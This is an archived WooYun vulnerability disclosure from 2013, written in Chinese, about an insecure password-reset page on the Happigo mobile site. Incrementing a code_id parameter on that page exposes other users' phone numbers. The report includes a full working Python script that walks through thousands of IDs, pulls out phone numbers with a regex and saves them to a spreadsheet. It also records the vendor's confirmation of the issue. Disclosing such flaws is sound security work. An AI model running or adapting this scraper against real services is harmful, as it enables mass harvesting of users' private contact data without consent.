@@ -1,0 +1,248 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		快乐购大量用户敏感信息泄露，可批量获取用户手机号  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		快乐购大量用户敏感信息泄露，可批量获取用户手机号  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/xfkxfk">xfkxfk</a> 
+</li><li>提交时间：		2013-07-03 15:07</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-07-03：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-07-03：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-07-13：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-07-23：	细节向普通白帽子公开<br/>
+									2013-08-02：	细节向实习白帽子公开<br/>
+									2013-08-17：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">快乐购大量用户敏感信息泄露，可批量获取</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">一、在忘记密码功能点，权限控制不严，存在大量用户敏感信息泄露<br />
+<br />
+</p><pre><code>url：m.happigo.com/user/login.php</code></pre><p class='detail'><br />
+<br />
+第一步进入登陆页面，点击忘记密码：<br />
+<br />
+</p><p class="detail"><a href="../images/0314593020b2e09b04090a3f2112ae3a6ebb9368.png" target="_blank"><img src="../images/0314593020b2e09b04090a3f2112ae3a6ebb9368.png" alt="12.png" width="600"/></a></p><p class="detail"><br />
+<br />
+第二步输入用户名，手机号码，用于发送验证码<br />
+<br />
+</p><p class="detail"><a href="../images/03145948ee4f21a8d7a5edf7eaf3b7e90ed7c336.png" target="_blank"><img src="../images/03145948ee4f21a8d7a5edf7eaf3b7e90ed7c336.png" alt="13.png" width="600"/></a></p><p class="detail"><br />
+<br />
+第三步要输入验证码，这里我们就不管了，现在看看url地址：<br />
+<br />
+</p><pre><code>http://m.happigo.com/user/checkcode.php?code_id=16059</code></pre><p class='detail'><br />
+<br />
+这个code_id就是存在问题，这里我是第16060位重置自己密码的用户，这里把用户的手机号码显示出来了，那么我们试试更改一下这个code_id，看能不能看到其他用户的手机号码。我们把code_id改为16059，如下图，果然可以看到其他用户的手机号码，上一个脚本爬出所有重置过密码的用户的手机号码，大量信息啊！！！<br />
+<br />
+</p><p class="detail"><a href="../images/0315000784e78b252933e0f0af47998184653418.png" target="_blank"><img src="../images/0315000784e78b252933e0f0af47998184653418.png" alt="14.png" width="600"/></a></p><p class="detail"><br />
+<br />
+下面给出脚本批量获取到的用户信息。<br />
+<br />
+============================================================================<br />
+<br />
+</p><pre><code>#-*- coding:utf-8-*-<br />
+import urllib2<br />
+from tempfile import TemporaryFile<br />
+from xlwt import Workbook<br />
+import re<br />
+<br />
+vulinfo_list = []<br />
+code_id_list = []<br />
+<br />
+def req_url(code_id):<br />
+    url = &quot;http://m.happigo.com/user/checkcode.php?code_id=%d&quot; % code_id<br />
+    req = urllib2.Request(url)<br />
+    req.add_header( &quot;Connection&quot;,&quot;keep-alive&quot; ) <br />
+    res = urllib2.urlopen( req )<br />
+    html = res.read()<br />
+    return html,code_id<br />
+<br />
+def match_info(html,code_id):<br />
+    if re.search(r&#039;\d{11}&#039;,html):<br />
+        phonenumber = re.search(r&#039;\d{11}&#039;,html).group()<br />
+        print &quot;[%s]手机号码：&quot; % code_id,phonenumber<br />
+        vulinfo_list.append(int(phonenumber))<br />
+        code_id_list.append(int(code_id))    <br />
+    <br />
+def thread_run(sheet1):<br />
+    for code_id in range(16060):<br />
+        html,code_id = req_url(code_id)<br />
+        match_info(html,code_id)<br />
+    <br />
+    if len(code_id_list) == len(vulinfo_list):    <br />
+        for i in range(len(vulinfo_list)):<br />
+            #for j in range(0,2):<br />
+            sheet1.write(i,0,code_id_list[i])<br />
+            sheet1.write(i,1,vulinfo_list[i])<br />
+<br />
+def run():<br />
+    book = Workbook()<br />
+    sheet1 = book.add_sheet(&#039;Sheet 1&#039;)<br />
+    thread_run(sheet1)<br />
+    <br />
+    book.save(&#039;happigo_user_phonenumber.xls&#039;)<br />
+    book.save(TemporaryFile())<br />
+<br />
+if __name__ == &quot;__main__&quot;:<br />
+run()</code></pre><p class='detail'><br />
+<br />
+============================================================================<br />
+<br />
+结果：<br />
+<br />
+</p><p class="detail"><a href="../images/03150143f2d1c501094ca13f7d51fdb12ac3bda9.png" target="_blank"><img src="../images/03150143f2d1c501094ca13f7d51fdb12ac3bda9.png" alt="15.png" width="600"/></a></p><p class="detail"><br />
+<br />
+由于这是很早前的截取的信息，截止目前已经差不多到1w用户手机号码了。<br />
+<br />
+<br />
+<br />
+二、声明<br />
+<br />
+没有泄露任何截获到的用户信息，及进行非法操作。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">见详细说明 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1、隐藏并控制好用户敏感信息<br />
+<br />
+ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/xfkxfk" title="xfkxfk">xfkxfk</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-027593" title="快乐购大量用户敏感信息泄露，可批量获取用户手机号">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：9 </p>
+													<p class="detail">确认时间：2013-07-03 15:51</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢xfkxfk对漏洞的提交，我们将尽快修复！</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="27593";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
